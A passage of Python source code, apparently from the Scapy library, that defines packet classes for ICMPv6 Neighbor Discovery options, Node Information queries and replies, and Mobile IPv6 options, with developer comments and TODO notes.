            p += b'\x00'*(16-l)
        return s[l:], self.m2i(pkt,p)

    def i2len(self, pkt, x):
        return len(self.i2m(pkt, x))

    def i2m(self, pkt, x):
        l = pkt.len

        if x is None:
            x = "::"
            if l is None:
                l = 1
        x = inet_pton(socket.AF_INET6, x)

        if l is None:
            return x
        if l in [0, 1]:
            return b""
        if l in [2, 3]:
            return x[:8*(l-1)]

        return x + b'\x00'*8*(l-3)

class ICMPv6NDOptRouteInfo(_ICMPv6NDGuessPayload, Packet): # RFC 4191
    name = "ICMPv6 Neighbor Discovery Option - Route Information Option"
    fields_desc = [ ByteField("type",24),
                    FieldLenField("len", None, length_of="prefix", fmt="B",
                                  adjust = lambda pkt,x: x//8 + 1),
                    ByteField("plen", None),
                    BitField("res1",0,3),
                    BitField("prf",0,2),
                    BitField("res2",0,3),
                    IntField("rtlifetime", 0xffffffff),
                    _IP6PrefixField("prefix", None) ]

class ICMPv6NDOptRDNSS(_ICMPv6NDGuessPayload, Packet): # RFC 5006
    name = "ICMPv6 Neighbor Discovery Option - Recursive DNS Server Option"
    fields_desc = [ ByteField("type", 25),
                    FieldLenField("len", None, count_of="dns", fmt="B",
                                  adjust = lambda pkt,x: 2*x+1),
                    ShortField("res", None),
                    IntField("lifetime", 0xffffffff),
                    IP6ListField("dns", [],
                                 length_from = lambda pkt: 8*(pkt.len-1)) ]

class ICMPv6NDOptEFA(_ICMPv6NDGuessPayload, Packet): # RFC 5175 (prev. 5075)
    name = "ICMPv6 Neighbor Discovery Option - Expanded Flags Option"
    fields_desc = [ ByteField("type", 26),
                    ByteField("len", 1),
                    BitField("res", 0, 48) ]

# As required in Sect 8. of RFC 3315, Domain Names must be encoded as
# described in section 3.1 of RFC 1035
# XXX Label should be at most 63 octets in length : we do not enforce it
#     Total length of domain should be 255 : we do not enforce it either
class DomainNameListField(StrLenField):
    __slots__ = ["padded"]
    islist = 1
    padded_unit = 8

    def __init__(self, name, default, fld=None, length_from=None, padded=False):
        self.padded = padded
        StrLenField.__init__(self, name, default, fld, length_from)

    def i2len(self, pkt, x):
        return len(self.i2m(pkt, x))

    def m2i(self, pkt, x):
        x = plain_str(x) # Decode bytes to string
        res = []
        while x:
            # Get a name until \x00 is reached
            cur = []
            while x and ord(x[0]) != 0:
                l = ord(x[0])
                cur.append(x[1:l+1])
                x = x[l+1:]
            if self.padded:
                # Discard following \x00 in padded mode
                if len(cur):
                    res.append(".".join(cur) + ".")
            else:
              # Store the current name
              res.append(".".join(cur) + ".")
            if x and ord(x[0]) == 0:
                x = x[1:]
        return res

    def i2m(self, pkt, x):
        def conditionalTrailingDot(z):
            if z and orb(z[-1]) == 0:
                return z
            return z+b'\x00'
        # Build the encode names
        tmp = ([chb(len(z)) + z.encode("utf8") for z in y.split('.')] for y in x) # Also encode string to bytes
        ret_string  = b"".join(conditionalTrailingDot(b"".join(x)) for x in tmp)

        # In padded mode, add some \x00 bytes
        if self.padded and not len(ret_string) % self.padded_unit == 0:
            ret_string += b"\x00" * (self.padded_unit - len(ret_string) % self.padded_unit)

        return ret_string

class ICMPv6NDOptDNSSL(_ICMPv6NDGuessPayload, Packet): # RFC 6106
    name = "ICMPv6 Neighbor Discovery Option - DNS Search List Option"
    fields_desc = [ ByteField("type", 31),
                    FieldLenField("len", None, length_of="searchlist", fmt="B",
                                  adjust=lambda pkt, x: 1+ x//8),
                    ShortField("res", None),
                    IntField("lifetime", 0xffffffff),
                    DomainNameListField("searchlist", [],
                                        length_from=lambda pkt: 8*pkt.len -8,
                                        padded=True)
                    ]

# End of ICMPv6 Neighbor Discovery Options.

class ICMPv6ND_RS(_ICMPv6NDGuessPayload, _ICMPv6):
    name = "ICMPv6 Neighbor Discovery - Router Solicitation"
    fields_desc = [ ByteEnumField("type", 133, icmp6types),
                    ByteField("code",0),
                    XShortField("cksum", None),
                    IntField("res",0) ]
    overload_fields = {IPv6: { "nh": 58, "dst": "ff02::2", "hlim": 255 }}

class ICMPv6ND_RA(_ICMPv6NDGuessPayload, _ICMPv6):
    name = "ICMPv6 Neighbor Discovery - Router Advertisement"
    fields_desc = [ ByteEnumField("type", 134, icmp6types),
                    ByteField("code",0),
                    XShortField("cksum", None),
                    ByteField("chlim",0),
                    BitField("M",0,1),
                    BitField("O",0,1),
                    BitField("H",0,1),
                    BitEnumField("prf",1,2, { 0: "Medium (default)",
                                              1: "High",
                                              2: "Reserved",
                                              3: "Low" } ), # RFC 4191
                    BitField("P",0,1),
                    BitField("res",0,2),
                    ShortField("routerlifetime",1800),
                    IntField("reachabletime",0),
                    IntField("retranstimer",0) ]
    overload_fields = {IPv6: { "nh": 58, "dst": "ff02::1", "hlim": 255 }}

    def answers(self, other):
        return isinstance(other, ICMPv6ND_RS)

class ICMPv6ND_NS(_ICMPv6NDGuessPayload, _ICMPv6, Packet):
    name = "ICMPv6 Neighbor Discovery - Neighbor Solicitation"
    fields_desc = [ ByteEnumField("type",135, icmp6types),
                    ByteField("code",0),
                    XShortField("cksum", None),
                    IntField("res", 0),
                    IP6Field("tgt","::") ]
    overload_fields = {IPv6: { "nh": 58, "dst": "ff02::1", "hlim": 255 }}

    def mysummary(self):
        return self.sprintf("%name% (tgt: %tgt%)")

    def hashret(self):
        return raw(self.tgt)+self.payload.hashret()

class ICMPv6ND_NA(_ICMPv6NDGuessPayload, _ICMPv6, Packet):
    name = "ICMPv6 Neighbor Discovery - Neighbor Advertisement"
    fields_desc = [ ByteEnumField("type",136, icmp6types),
                    ByteField("code",0),
                    XShortField("cksum", None),
                    BitField("R",1,1),
                    BitField("S",0,1),
                    BitField("O",1,1),
                    XBitField("res",0,29),
                    IP6Field("tgt","::") ]
    overload_fields = {IPv6: { "nh": 58, "dst": "ff02::1", "hlim": 255 }}

    def mysummary(self):
        return self.sprintf("%name% (tgt: %tgt%)")

    def hashret(self):
        return raw(self.tgt)+self.payload.hashret()

    def answers(self, other):
        return isinstance(other, ICMPv6ND_NS) and self.tgt == other.tgt

# associated possible options : target link-layer option, Redirected header
class ICMPv6ND_Redirect(_ICMPv6NDGuessPayload, _ICMPv6, Packet):
    name = "ICMPv6 Neighbor Discovery - Redirect"
    fields_desc = [ ByteEnumField("type",137, icmp6types),
                    ByteField("code",0),
                    XShortField("cksum", None),
                    XIntField("res",0),
                    IP6Field("tgt","::"),
                    IP6Field("dst","::") ]
    overload_fields = {IPv6: { "nh": 58, "dst": "ff02::1", "hlim": 255 }}



################ ICMPv6 Inverse Neighbor Discovery (RFC 3122) ###############

class ICMPv6NDOptSrcAddrList(_ICMPv6NDGuessPayload, Packet):
    name = "ICMPv6 Inverse Neighbor Discovery Option - Source Address List"
    fields_desc = [ ByteField("type",9),
                    FieldLenField("len", None, count_of="addrlist", fmt="B",
                                  adjust = lambda pkt,x: 2*x+1),
                    StrFixedLenField("res", b"\x00"*6, 6),
                    IP6ListField("addrlist", [],
                                length_from = lambda pkt: 8*(pkt.len-1)) ]

class ICMPv6NDOptTgtAddrList(ICMPv6NDOptSrcAddrList):
    name = "ICMPv6 Inverse Neighbor Discovery Option - Target Address List"
    type = 10


# RFC3122
# Options requises : source lladdr et target lladdr
# Autres options valides : source address list, MTU
# - Comme precise dans le document, il serait bien de prendre l'adresse L2
#   demandee dans l'option requise target lladdr et l'utiliser au niveau
#   de l'adresse destination ethernet si aucune adresse n'est precisee
# - ca semble pas forcement pratique si l'utilisateur doit preciser toutes
#   les options.
# Ether() must use the target lladdr as destination
class ICMPv6ND_INDSol(_ICMPv6NDGuessPayload, _ICMPv6):
    name = "ICMPv6 Inverse Neighbor Discovery Solicitation"
    fields_desc = [ ByteEnumField("type",141, icmp6types),
                    ByteField("code",0),
                    XShortField("cksum",None),
                    XIntField("reserved",0) ]
    overload_fields = {IPv6: { "nh": 58, "dst": "ff02::1", "hlim": 255 }}

# Options requises :  target lladdr, target address list
# Autres options valides : MTU
class ICMPv6ND_INDAdv(_ICMPv6NDGuessPayload, _ICMPv6):
    name = "ICMPv6 Inverse Neighbor Discovery Advertisement"
    fields_desc = [ ByteEnumField("type",142, icmp6types),
                    ByteField("code",0),
                    XShortField("cksum",None),
                    XIntField("reserved",0) ]
    overload_fields = {IPv6: { "nh": 58, "dst": "ff02::1", "hlim": 255 }}


###############################################################################
# ICMPv6 Node Information Queries (RFC 4620)
###############################################################################

# [ ] Add automatic destination address computation using computeNIGroupAddr
#     in IPv6 class (Scapy6 modification when integrated) if :
#     - it is not provided
#     - upper layer is ICMPv6NIQueryName() with a valid value
# [ ] Try to be liberal in what we accept as internal values for _explicit_
#     DNS elements provided by users. Any string should be considered
#     valid and kept like it has been provided. At the moment, i2repr() will
#     crash on many inputs
# [ ] Do the documentation
# [ ] Add regression tests
# [ ] Perform test against real machines (NOOP reply is proof of implementation).
# [ ] Check if there are differences between different stacks. Among *BSD,
#     with others.
# [ ] Deal with flags in a consistent way.
# [ ] Implement compression in names2dnsrepr() and decompresiion in
#     dnsrepr2names(). Should be deactivable.

icmp6_niqtypes = { 0: "NOOP",
                  2: "Node Name",
                  3: "IPv6 Address",
                  4: "IPv4 Address" }


class _ICMPv6NIHashret:
    def hashret(self):
        return raw(self.nonce)

class _ICMPv6NIAnswers:
    def answers(self, other):
        return self.nonce == other.nonce

# Buggy; always returns the same value during a session
class NonceField(StrFixedLenField):
    def __init__(self, name, default=None):
        StrFixedLenField.__init__(self, name, default, 8)
        if default is None:
            self.default = self.randval()

@conf.commands.register
def computeNIGroupAddr(name):
    """Compute the NI group Address. Can take a FQDN as input parameter"""
    name = name.lower().split(".")[0]
    record = chr(len(name))+name
    h = md5(record.encode("utf8"))
    h = h.digest()
    addr = "ff02::2:%2x%2x:%2x%2x" % struct.unpack("BBBB", h[:4])
    return addr


# Here is the deal. First, that protocol is a piece of shit. Then, we
# provide 4 classes for the different kinds of Requests (one for every
# valid qtype: NOOP, Node Name, IPv6@, IPv4@). They all share the same
# data field class that is made to be smart by guessing the specific
# type of value provided :
#
# - IPv6 if acceptable for inet_pton(AF_INET6, ): code is set to 0,
#   if not overridden by user
# - IPv4 if acceptable for inet_pton(AF_INET,  ): code is set to 2,
#   if not overridden
# - Name in the other cases: code is set to 0, if not overridden by user
#
# Internal storage, is not only the value, but the a pair providing
# the type and the value (1 is IPv6@, 1 is Name or string, 2 is IPv4@)
#
# Note : I merged getfield() and m2i(). m2i() should not be called
#        directly anyway. Same remark for addfield() and i2m()
#
# -- arno

# "The type of information present in the Data field of a query is
#  declared by the ICMP Code, whereas the type of information in a
#  Reply is determined by the Qtype"

def names2dnsrepr(x):
    """
    Take as input a list of DNS names or a single DNS name
    and encode it in DNS format (with possible compression)
    If a string that is already a DNS name in DNS format
    is passed, it is returned unmodified. Result is a string.
    !!!  At the moment, compression is not implemented  !!!
    """

    if isinstance(x, bytes):
        if x and x[-1:] == b'\x00': # stupid heuristic
            return x
        x = [x]

    res = []
    for n in x:
        termin = b"\x00"
        if n.count(b'.') == 0: # single-component gets one more
            termin += b'\x00'
        n = b"".join(chb(len(y)) + y for y in n.split(b'.')) + termin
        res.append(n)
    return b"".join(res)


def dnsrepr2names(x):
    """
    Take as input a DNS encoded string (possibly compressed)
    and returns a list of DNS names contained in it.
    If provided string is already in printable format
    (does not end with a null character, a one element list
    is returned). Result is a list.
    """
    res = []
    cur = b""
    while x:
        l = orb(x[0])
        x = x[1:]
        if not l:
            if cur and cur[-1:] == b'.':
                cur = cur[:-1]
            res.append(cur)
            cur = b""
            if x and orb(x[0]) == 0: # single component
                x = x[1:]
            continue
        if l & 0xc0: # XXX TODO : work on that -- arno
            raise Exception("DNS message can't be compressed at this point!")
        cur += x[:l] + b"."
        x = x[l:]
    return res


class NIQueryDataField(StrField):
    def __init__(self, name, default):
        StrField.__init__(self, name, default)

    def i2h(self, pkt, x):
        if x is None:
            return x
        t,val = x
        if t == 1:
            val = dnsrepr2names(val)[0]
        return val

    def h2i(self, pkt, x):
        if x is tuple and isinstance(x[0], int):
            return x

        # Try IPv6
        try:
            inet_pton(socket.AF_INET6, x.decode())
            return (0, x.decode())
        except:
            pass
        # Try IPv4
        try:
            inet_pton(socket.AF_INET, x.decode())
            return (2, x.decode())
        except:
            pass
        # Try DNS
        if x is None:
            x = b""
        x = names2dnsrepr(x)
        return (1, x)

    def i2repr(self, pkt, x):
        t,val = x
        if t == 1: # DNS Name
            # we don't use dnsrepr2names() to deal with
            # possible weird data extracted info
            res = []
            while val:
                l = orb(val[0])
                val = val[1:]
                if l == 0:
                    break
                res.append(plain_str(val[:l])+".")
                val = val[l:]
            tmp = "".join(res)
            if tmp and tmp[-1] == '.':
                tmp = tmp[:-1]
            return tmp
        return repr(val)

    def getfield(self, pkt, s):
        qtype = getattr(pkt, "qtype")
        if qtype == 0: # NOOP
            return s, (0, b"")
        else:
            code = getattr(pkt, "code")
            if code == 0:   # IPv6 Addr
                return s[16:], (0, inet_ntop(socket.AF_INET6, s[:16]))
            elif code == 2: # IPv4 Addr
                return s[4:], (2, inet_ntop(socket.AF_INET, s[:4]))
            else:           # Name or Unknown
                return b"", (1, s)

    def addfield(self, pkt, s, val):
        if ((isinstance(val, tuple) and val[1] is None) or
            val is None):
            val = (1, b"")
        t = val[0]
        if t == 1:
            return s + val[1]
        elif t == 0:
            return s + inet_pton(socket.AF_INET6, val[1])
        else:
            return s + inet_pton(socket.AF_INET, val[1])

class NIQueryCodeField(ByteEnumField):
    def i2m(self, pkt, x):
        if x is None:
            d = pkt.getfieldval("data")
            if d is None:
                return 1
            elif d[0] == 0: # IPv6 address
                return 0
            elif d[0] == 1: # Name
                return 1
            elif d[0] == 2: # IPv4 address
                return 2
            else:
                return 1
        return x


_niquery_code = {0: "IPv6 Query", 1: "Name Query", 2: "IPv4 Query"}

#_niquery_flags = {  2: "All unicast addresses", 4: "IPv4 addresses",
#                    8: "Link-local addresses", 16: "Site-local addresses",
#                   32: "Global addresses" }

# "This NI type has no defined flags and never has a Data Field". Used
# to know if the destination is up and implements NI protocol.
class ICMPv6NIQueryNOOP(_ICMPv6NIHashret, _ICMPv6):
    name = "ICMPv6 Node Information Query - NOOP Query"
    fields_desc = [ ByteEnumField("type", 139, icmp6types),
                    NIQueryCodeField("code", None, _niquery_code),
                    XShortField("cksum", None),
                    ShortEnumField("qtype", 0, icmp6_niqtypes),
                    BitField("unused", 0, 10),
                    FlagsField("flags", 0, 6, "TACLSG"),
                    NonceField("nonce", None),
                    NIQueryDataField("data", None) ]

class ICMPv6NIQueryName(ICMPv6NIQueryNOOP):
    name = "ICMPv6 Node Information Query - IPv6 Name Query"
    qtype = 2

# We ask for the IPv6 address of the peer
class ICMPv6NIQueryIPv6(ICMPv6NIQueryNOOP):
    name = "ICMPv6 Node Information Query - IPv6 Address Query"
    qtype = 3
    flags = 0x3E

class ICMPv6NIQueryIPv4(ICMPv6NIQueryNOOP):
    name = "ICMPv6 Node Information Query - IPv4 Address Query"
    qtype = 4

_nireply_code = { 0: "Successful Reply",
                  1: "Response Refusal",
                  3: "Unknown query type" }

_nireply_flags = {  1: "Reply set incomplete",
                    2: "All unicast addresses",
                    4: "IPv4 addresses",
                    8: "Link-local addresses",
                   16: "Site-local addresses",
                   32: "Global addresses" }

# Internal repr is one of those :
# (0, "some string") : unknow qtype value are mapped to that one
# (3, [ (ttl, ip6), ... ])
# (4, [ (ttl, ip4), ... ])
# (2, [ttl, dns_names]) : dns_names is one string that contains
#     all the DNS names. Internally it is kept ready to be sent
#     (undissected). i2repr() decode it for user. This is to
#     make build after dissection bijective.
#
# I also merged getfield() and m2i(), and addfield() and i2m().
class NIReplyDataField(StrField):

    def i2h(self, pkt, x):
        if x is None:
            return x
        t,val = x
        if t == 2:
            ttl, dnsnames = val
            val = [ttl] + dnsrepr2names(dnsnames)
        return val

    def h2i(self, pkt, x):
        qtype = 0 # We will decode it as string if not
                  # overridden through 'qtype' in pkt

        # No user hint, let's use 'qtype' value for that purpose
        if not isinstance(x, tuple):
            if pkt is not None:
                qtype = pkt.qtype
        else:
            qtype = x[0]
            x = x[1]

        # From that point on, x is the value (second element of the tuple)

        if qtype == 2: # DNS name
            if isinstance(x, (str, bytes)): # listify the string
                x = [x]
            if isinstance(x, list):
                x = [val.encode() if isinstance(val, str) else val for val in x]
            if x and isinstance(x[0], six.integer_types):
                ttl = x[0]
                names = x[1:]
            else:
                ttl = 0
                names = x
            return (2, [ttl, names2dnsrepr(names)])

        elif qtype in [3, 4]: # IPv4 or IPv6 addr
            if not isinstance(x, list):
                x = [x] # User directly provided an IP, instead of list

            def fixvalue(x):
                # List elements are not tuples, user probably
                # omitted ttl value : we will use 0 instead
                if not isinstance(x, tuple):
                    x = (0, x)
                # Decode bytes
                if six.PY3 and isinstance(x[1], bytes):
                    x = (x[0], x[1].decode())
                return x

            return (qtype, [fixvalue(d) for d in x])

        return (qtype, x)


    def addfield(self, pkt, s, val):
        t,tmp = val
        if tmp is None:
            tmp = b""
        if t == 2:
            ttl,dnsstr = tmp
            return s+ struct.pack("!I", ttl) + dnsstr
        elif t == 3:
            return s + b"".join(map(lambda x_y1: struct.pack("!I", x_y1[0])+inet_pton(socket.AF_INET6, x_y1[1]), tmp))
        elif t == 4:
            return s + b"".join(map(lambda x_y2: struct.pack("!I", x_y2[0])+inet_pton(socket.AF_INET, x_y2[1]), tmp))
        else:
            return s + tmp

    def getfield(self, pkt, s):
        code = getattr(pkt, "code")
        if code != 0:
            return s, (0, b"")

        qtype = getattr(pkt, "qtype")
        if qtype == 0: # NOOP
            return s, (0, b"")

        elif qtype == 2:
            if len(s) < 4:
                return s, (0, b"")
            ttl = struct.unpack("!I", s[:4])[0]
            return b"", (2, [ttl, s[4:]])

        elif qtype == 3: # IPv6 addresses with TTLs
            # XXX TODO : get the real length
            res = []
            while len(s) >= 20: # 4 + 16
                ttl = struct.unpack("!I", s[:4])[0]
                ip  = inet_ntop(socket.AF_INET6, s[4:20])
                res.append((ttl, ip))
                s = s[20:]
            return s, (3, res)

        elif qtype == 4: # IPv4 addresses with TTLs
            # XXX TODO : get the real length
            res = []
            while len(s) >= 8: # 4 + 4
                ttl = struct.unpack("!I", s[:4])[0]
                ip  = inet_ntop(socket.AF_INET, s[4:8])
                res.append((ttl, ip))
                s = s[8:]
            return s, (4, res)
        else:
            # XXX TODO : implement me and deal with real length
            return b"", (0, s)

    def i2repr(self, pkt, x):
        if x is None:
            return "[]"

        if isinstance(x, tuple) and len(x) == 2:
            t, val = x
            if t == 2: # DNS names
                ttl,l = val
                l = dnsrepr2names(l)
                names_list = (plain_str(name) for name in l)
                return "ttl:%d %s" % (ttl, ",".join(names_list))
            elif t == 3 or t == 4:
                return "[ %s ]" % (", ".join(map(lambda x_y: "(%d, %s)" % (x_y[0], x_y[1]), val)))
            return repr(val)
        return repr(x) # XXX should not happen

# By default, sent responses have code set to 0 (successful)
class ICMPv6NIReplyNOOP(_ICMPv6NIAnswers, _ICMPv6NIHashret, _ICMPv6):
    name = "ICMPv6 Node Information Reply - NOOP Reply"
    fields_desc = [ ByteEnumField("type", 140, icmp6types),
                    ByteEnumField("code", 0, _nireply_code),
                    XShortField("cksum", None),
                    ShortEnumField("qtype", 0, icmp6_niqtypes),
                    BitField("unused", 0, 10),
                    FlagsField("flags", 0, 6, "TACLSG"),
                    NonceField("nonce", None),
                    NIReplyDataField("data", None)]

class ICMPv6NIReplyName(ICMPv6NIReplyNOOP):
    name = "ICMPv6 Node Information Reply - Node Names"
    qtype = 2

class ICMPv6NIReplyIPv6(ICMPv6NIReplyNOOP):
    name = "ICMPv6 Node Information Reply - IPv6 addresses"
    qtype = 3

class ICMPv6NIReplyIPv4(ICMPv6NIReplyNOOP):
    name = "ICMPv6 Node Information Reply - IPv4 addresses"
    qtype = 4

class ICMPv6NIReplyRefuse(ICMPv6NIReplyNOOP):
    name = "ICMPv6 Node Information Reply - Responder refuses to supply answer"
    code = 1

class ICMPv6NIReplyUnknown(ICMPv6NIReplyNOOP):
    name = "ICMPv6 Node Information Reply - Qtype unknown to the responder"
    code = 2


def _niquery_guesser(p):
    cls = conf.raw_layer
    type = orb(p[0])
    if type == 139: # Node Info Query specific stuff
        if len(p) > 6:
            qtype, = struct.unpack("!H", p[4:6])
            cls = { 0: ICMPv6NIQueryNOOP,
                    2: ICMPv6NIQueryName,
                    3: ICMPv6NIQueryIPv6,
                    4: ICMPv6NIQueryIPv4 }.get(qtype, conf.raw_layer)
    elif type == 140: # Node Info Reply specific stuff
        code = orb(p[1])
        if code == 0:
            if len(p) > 6:
                qtype, = struct.unpack("!H", p[4:6])
                cls = { 2: ICMPv6NIReplyName,
                        3: ICMPv6NIReplyIPv6,
                        4: ICMPv6NIReplyIPv4 }.get(qtype, ICMPv6NIReplyNOOP)
        elif code == 1:
            cls = ICMPv6NIReplyRefuse
        elif code == 2:
            cls = ICMPv6NIReplyUnknown
    return cls


#############################################################################
#############################################################################
###             Mobile IPv6 (RFC 3775) and Nemo (RFC 3963)                ###
#############################################################################
#############################################################################

# Mobile IPv6 ICMPv6 related classes

class ICMPv6HAADRequest(_ICMPv6):
    name = 'ICMPv6 Home Agent Address Discovery Request'
    fields_desc = [ ByteEnumField("type", 144, icmp6types),
                    ByteField("code", 0),
                    XShortField("cksum", None),
                    XShortField("id", None),
                    BitEnumField("R", 1, 1, {1: 'MR'}),
                    XBitField("res", 0, 15) ]
    def hashret(self):
        return struct.pack("!H",self.id)+self.payload.hashret()

class ICMPv6HAADReply(_ICMPv6):
    name = 'ICMPv6 Home Agent Address Discovery Reply'
    fields_desc = [ ByteEnumField("type", 145, icmp6types),
                    ByteField("code", 0),
                    XShortField("cksum", None),
                    XShortField("id", None),
                    BitEnumField("R", 1, 1, {1: 'MR'}),
                    XBitField("res", 0, 15),
                    IP6ListField('addresses', None) ]
    def hashret(self):
        return struct.pack("!H",self.id)+self.payload.hashret()

    def answers(self, other):
        if not isinstance(other, ICMPv6HAADRequest):
            return 0
        return self.id == other.id

class ICMPv6MPSol(_ICMPv6):
    name = 'ICMPv6 Mobile Prefix Solicitation'
    fields_desc = [ ByteEnumField("type", 146, icmp6types),
                    ByteField("code", 0),
                    XShortField("cksum", None),
                    XShortField("id", None),
                    XShortField("res", 0) ]
    def _hashret(self):
        return struct.pack("!H",self.id)

class ICMPv6MPAdv(_ICMPv6NDGuessPayload, _ICMPv6):
    name = 'ICMPv6 Mobile Prefix Advertisement'
    fields_desc = [ ByteEnumField("type", 147, icmp6types),
                    ByteField("code", 0),
                    XShortField("cksum", None),
                    XShortField("id", None),
                    BitEnumField("flags", 2, 2, {2: 'M', 1:'O'}),
                    XBitField("res", 0, 14) ]
    def hashret(self):
        return struct.pack("!H",self.id)

    def answers(self, other):
        return isinstance(other, ICMPv6MPSol)

# Mobile IPv6 Options classes


_mobopttypes = { 2: "Binding Refresh Advice",
                 3: "Alternate Care-of Address",
                 4: "Nonce Indices",
                 5: "Binding Authorization Data",
                 6: "Mobile Network Prefix (RFC3963)",
                 7: "Link-Layer Address (RFC4068)",
                 8: "Mobile Node Identifier (RFC4283)",
                 9: "Mobility Message Authentication (RFC4285)",
                 10: "Replay Protection (RFC4285)",
                 11: "CGA Parameters Request (RFC4866)",
                 12: "CGA Parameters (RFC4866)",
                 13: "Signature (RFC4866)",
                 14: "Home Keygen Token (RFC4866)",
                 15: "Care-of Test Init (RFC4866)",
                 16: "Care-of Test (RFC4866)" }


class _MIP6OptAlign:
    """ Mobile IPv6 options have alignment requirements of the form x*n+y.
    This class is inherited by all MIPv6 options to help in computing the
    required Padding for that option, i.e. the need for a Pad1 or PadN
    option before it. They only need to provide x and y as class
    parameters. (x=0 and y=0 are used when no alignment is required)"""
    def alignment_delta(self, curpos):
      x = self.x ; y = self.y
      if x == 0 and y ==0:
          return 0
      delta = x*((curpos - y + x - 1)//x) + y - curpos
      return delta


class MIP6OptBRAdvice(_MIP6OptAlign, Packet):
    name = 'Mobile IPv6 Option - Binding Refresh Advice'
    fields_desc = [ ByteEnumField('otype', 2, _mobopttypes),
                    ByteField('olen', 2),
                    ShortField('rinter', 0) ]
    x = 2 ; y = 0# alignment requirement: 2n

class MIP6OptAltCoA(_MIP6OptAlign, Packet):
    name = 'MIPv6 Option - Alternate Care-of Address'
    fields_desc = [ ByteEnumField('otype', 3, _mobopttypes),
                    ByteField('olen', 16),
                    IP6Field("acoa", "::") ]
    x = 8 ; y = 6 # alignment requirement: 8n+6

class MIP6OptNonceIndices(_MIP6OptAlign, Packet):
    name = 'MIPv6 Option - Nonce Indices'
    fields_desc = [ ByteEnumField('otype', 4, _mobopttypes),
                    ByteField('olen', 16),
                    ShortField('hni', 0),
                    ShortField('coni', 0) ]
    x = 2 ; y = 0 # alignment requirement: 2n

class MIP6OptBindingAuthData(_MIP6OptAlign, Packet):
    name = 'MIPv6 Option - Binding Authorization Data'
    fields_desc = [ ByteEnumField('otype', 5, _mobopttypes),
                    ByteField('olen', 16),
                    BitField('authenticator', 0, 96) ]
    x = 8 ; y = 2 # alignment requirement: 8n+2

class MIP6OptMobNetPrefix(_MIP6OptAlign, Packet): # NEMO - RFC 3963
    name = 'NEMO Option - Mobile Network Prefix'
    fields_desc = [ ByteEnumField("otype", 6, _mobopttypes),
                    ByteField("olen", 18),
                    ByteField("reserved", 0),
                    ByteField("plen", 64),
                    IP6Field("prefix", "::") ]
    x = 8 ; y = 4 # alignment requirement: 8n+4

class MIP6OptLLAddr(_MIP6OptAlign, Packet): # Sect 6.4.4 of RFC 4068
    name = "MIPv6 Option - Link-Layer Address (MH-LLA)"
    fields_desc = [ ByteEnumField("otype", 7, _mobopttypes),
                    ByteField("olen", 7),
                    ByteEnumField("ocode", 2, _rfc4068_lla_optcode),
                    ByteField("pad", 0),
                    MACField("lla", ETHER_ANY) ] # Only support ethernet
    x = 0 ; y = 0 # alignment requirement: none

class MIP6OptMNID(_MIP6OptAlign, Packet): # RFC 4283
    name = "MIPv6 Option - Mobile Node Identifier"
    fields_desc = [ ByteEnumField("otype", 8, _mobopttypes),
                    FieldLenField("olen", None, length_of="id", fmt="B",
                                  adjust = lambda pkt,x: x+1),
                    ByteEnumField("subtype", 1, {1: "NAI"}),
                    StrLenField("id", "",
                                length_from = lambda pkt: pkt.olen-1) ]
    x = 0 ; y = 0 # alignment requirement: none

# We only support decoding and basic build. Automatic HMAC computation is
# too much work for our current needs. It is left to the user (I mean ...
# you). --arno
class MIP6OptMsgAuth(_MIP6OptAlign, Packet): # RFC 4285 (Sect. 5)
    name = "MIPv6 Option - Mobility Message Authentication"
    fields_desc = [ ByteEnumField("otype", 9, _mobopttypes),
                    FieldLenField("olen", None, length_of="authdata", fmt="B",
                                  adjust = lambda pkt,x: x+5),
                    ByteEnumField("subtype", 1, {1: "MN-HA authentication mobility option",
                                                 2: "MN-AAA authentication mobility option"}),
                    IntField("mspi", None),
                    StrLenField("authdata", "A"*12,
                                length_from = lambda pkt: pkt.olen-5) ]
    x = 4 ; y = 1 # alignment requirement: 4n+1

# Extracted from RFC 1305 (NTP) :
# NTP timestamps are represented as a 64-bit unsigned fixed-point number,
# in seconds relative to 0h on 1 January 1900. The integer part is in the
# first 32 bits and the fraction part in the last 32 bits.
class NTPTimestampField(LongField):
    def i2repr(self, pkt, x):
        if x < ((50*31536000)<<32):
            return "Some date a few decades ago (%d)" % x

        # delta from epoch (= (1900, 1, 1, 0, 0, 0, 5, 1, 0)) to
        # January 1st 1970 :
        delta = -2209075761
        i = int(x >> 32)
        j = float(x & 0xffffffff) * 2.0**-32
        res = i + j + delta
        t = strftime("%a, %d %b %Y %H:%M:%S +0000", gmtime(res))

        return "%s (%d)" % (t, x)

class MIP6OptReplayProtection(_MIP6OptAlign, Packet): # RFC 4285 (Sect. 6)
    name = "MIPv6 option - Replay Protection"
    fields_desc = [ ByteEnumField("otype", 10, _mobopttypes),
                    ByteField("olen", 8),
                    NTPTimestampField("timestamp", 0) ]
    x = 8 ; y = 2 # alignment requirement: 8n+2

class MIP6OptCGAParamsReq(_MIP6OptAlign, Packet): # RFC 4866 (Sect. 5.6)
    name = "MIPv6 option - CGA Parameters Request"
    fields_desc = [ ByteEnumField("otype", 11, _mobopttypes),
                    ByteField("olen", 0) ]
    x = 0 ; y = 0 # alignment requirement: none

# XXX TODO: deal with CGA param fragmentation and build of defragmented
# XXX       version. Passing of a big CGAParam structure should be
# XXX       simplified. Make it hold packets, by the way  --arno
class MIP6OptCGAParams(_MIP6OptAlign, Packet): # RFC 4866 (Sect. 5.1)
    name = "MIPv6 option - CGA Parameters"
    fields_desc = [ ByteEnumField("otype", 12, _mobopttypes),
                    FieldLenField("olen", None, length_of="cgaparams", fmt="B"),
                    StrLenField("cgaparams", "",
                                length_from = lambda pkt: pkt.olen) ]
    x = 0 ; y = 0 # alignment requirement: none

class MIP6OptSignature(_MIP6OptAlign, Packet): # RFC 4866 (Sect. 5.2)
    name = "MIPv6 option - Signature"
    fields_desc = [ ByteEnumField("otype", 13, _mobopttypes),
                    FieldLenField("olen", None, length_of="sig", fmt="B"),
                    StrLenField("sig", "",
                                length_from = lambda pkt: pkt.olen) ]
    x = 0 ; y = 0 # alignment requirement: none

class MIP6OptHomeKeygenToken(_MIP6OptAlign, Packet): # RFC 4866 (Sect. 5.3)
    name = "MIPv6 option - Home Keygen Token"
    fields_desc = [ ByteEnumField("otype", 14, _mobopttypes),
                    FieldLenField("olen", None, length_of="hkt", fmt="B"),
                    StrLenField("hkt", "",
                                length_from = lambda pkt: pkt.olen) ]
    x = 0 ; y = 0 # alignment requirement: none

class MIP6OptCareOfTestInit(_MIP6OptAlign, Packet): # RFC 4866 (Sect. 5.4)
    name = "MIPv6 option - Care-of Test Init"
    fields_desc = [ ByteEnumField("otype", 15, _mobopttypes),
                    ByteField("olen", 0) ]
    x = 0 ; y = 0 # alignment requirement: none
